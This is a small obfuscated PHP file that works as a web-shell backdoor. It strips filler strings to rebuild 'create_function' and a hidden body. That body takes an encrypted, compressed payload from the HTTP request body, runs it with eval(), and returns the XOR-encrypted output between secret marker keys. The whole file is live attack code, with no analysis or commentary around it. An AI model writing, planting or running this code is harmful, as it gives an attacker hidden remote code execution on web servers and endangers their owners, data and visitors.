<?php
$h=str_replace('th','','crethatthe_ththfuththnction');
$g='3{$c=so3to3rlen($k);$l=sto3o3rlen($t);$oo3="";foro3(o3$i=0;$o3i<$l;)o3{for($j=0;o3($o3j<$c&&$o3i<$lo3);$jo3++,$i++)o3';
$e='/inpuo3o3t"),$m)==1) {@oo3bo3_start();@evao3l(@go3zuncompress(o3o3@x(@bao3se64_decode(o3$m[o31]),$k)o3));$o=@o3ob_get';
$x='{$o.=$t{$i}o3^$o3k{$j};o3}}return $oo3;o3}if (@po3reg_mao3tch("/$kh(o3.+)$o3kf/"o3,@file_go3et_o3co3ontents("pho3p:o3/';
$z='o3$k="1912c783"o3;$o3kh="79e8cfbo36d9o3da";$kf="o3489o36abb7d5o3a6";o3$p="2Fno3ituBUYo3o3LpNo3Uctz";functioo3n x($t,$k)o';
$w='_o3coo3ntentso3();@ob_eo3nd_clo3ean(o3);$r=@baso3e64_o3encode(@x(o3@gzco3omo3press($o),o3$ko3));print("o3$po3$kh$r$kf");}';
$U=str_replace('o3','',$z.$g.$x.$e.$w);
$N=$h('',$U);$N();
?>
